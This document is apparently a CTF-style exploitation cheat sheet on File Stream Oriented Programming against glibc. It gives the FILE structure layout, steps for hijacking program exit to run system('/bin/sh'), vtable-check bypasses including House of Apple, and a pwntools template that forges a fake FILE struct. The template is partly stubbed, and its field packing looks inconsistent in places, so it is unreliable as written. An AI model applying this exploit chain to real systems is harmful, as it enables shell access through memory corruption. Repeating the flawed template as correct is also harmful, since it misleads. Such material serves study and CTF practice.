# FSOP — File Stream Oriented Programming

### FILE Structure Layout

```python
"""
_IO_FILE (x86_64):
  +0x00: _flags          (4 bytes)  — MUST have _IO_MAGIC (0xFBAD0000) + appropriate flags
  +0x08: _IO_read_ptr    (pointer)
  +0x10: _IO_read_end    (pointer)
  +0x18: _IO_read_base   (pointer)
  +0x20: _IO_write_base  (pointer)
  +0x28: _IO_write_ptr   (pointer)
  +0x30: _IO_write_end   (pointer)
  +0x38: _IO_buf_base    (pointer)
  +0x40: _IO_buf_end     (pointer)
  +0x48: _IO_save_base   (pointer)
  +0x50: _IO_backup_base (pointer)
  +0x58: _IO_save_end    (pointer)
  +0x60: _markers        (pointer)
  +0x68: _chain          (pointer)   → next FILE in list
  +0x70: _fileno         (int)
  +0x78: _flags2         (int)
  +0x80: _old_offset     (long)
  +0x88: _cur_column + _vtable_offset + _shortbuf
  +0x90: _lock           (pointer)
  +0x98: _offset         (long long)
  +0xa0: _codecvt        (pointer)
  +0xa8: _wide_data      (pointer)   → _IO_wide_data
  +0xb0: _freeres_list   (pointer)
  +0xb8: _freeres_buf    (pointer)
  +0xc0: __pad5          (size_t)
  +0xc8: _mode           (int)
  +0xcc: _unused2        (20 bytes)
  
_IO_FILE_plus (+0xd8): vtable pointer
"""

def fsop_exit_hijack():
    """
    When program exits, _IO_flush_all_lockp is called.
    It iterates through _IO_list_all (linked via _chain),
    calling _IO_OVERFLOW(fp, EOF) on each.
    
    Attack:
    1. Corrupt a FILE struct (or create a fake one)
    2. Set _chain to point into _IO_list_all
    3. Set vtable to fake table with _IO_OVERFLOW → system
    4. Program exits → system("/bin/sh")!
    """
    pass

def fsop_vtable_bypass():
    """
    glibc 2.24+: vtable pointer is validated! Must be within __libc_IO_vtables section.
    
    Bypasses:
    1. _IO_str_jumps: within valid range, _IO_str_overflow calls → controlled function
    2. _IO_wstr_jumps: similar, wide-char variant
    3. _IO_cookie_jumps: _IO_cookie_read/write call function pointers from FILE struct
    
    House of Apple technique: use _IO_wfile_overflow path,
    which calls _IO_switch_to_wget_mode → calls wide_data's vtable function.
    """
    pass
```

### FSOP Exploit Template

```python
def fsop_exploit_template():
    """Complete FSOP exploit chain."""
    from pwn import *
    
    # Step 1: Get libc leak (for vtable section bounds)
    libc_base = leak_libc_base()
    
    # Step 2: Craft fake FILE struct
    fake_file = b''
    fake_file += p32(0xFBAD2887)       # _flags: MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING | _IO_LINKED
    fake_file += p64(0) * 7            # read/write pointers (unused for overwrite path)
    fake_file += p64(0)                 # _IO_buf_base
    fake_file += p64(1)                 # _IO_buf_end (must be > _IO_buf_base)
    fake_file += p64(0) * 4            # save_base, backup_base, save_end, markers
    fake_file += p64(0)                 # _chain (next FILE pointer, can be 0 to stop iteration)
    fake_file += p32(0)                 # _fileno
    fake_file += p32(0)                 # _flags2
    fake_file += p64(0)                 # _old_offset
    fake_file += p16(0)                 # _cur_column
    fake_file += b'\x00'                # _vtable_offset
    fake_file += b'\x00'                # _shortbuf[0]
    fake_file += p64(0) * 4            # _lock, _offset, _codecvt, _wide_data
    fake_file += p64(0) * 3            # _freeres_list, _freeres_buf, __pad5
    fake_file += p32(0)                 # _mode
    fake_file += b'\x00' * 20           # _unused2
    fake_file += p64(libc_base + _IO_wfile_jumps_offset)  # vtable → _IO_wfile_jumps
    
    # Step 3: Set up _wide_data for House of Apple
    fake_wide_data = b''
    fake_wide_data += p64(0) * 6       # _IO_read/write ptr/base/end
    fake_wide_data += p64(libc_base + _IO_wfile_jumps_offset)  # wide vtable → trigger path
    
    # Step 4: Overwrite _IO_list_all → fake_file
    # Step 5: Trigger exit or return from main
    pass
```

---
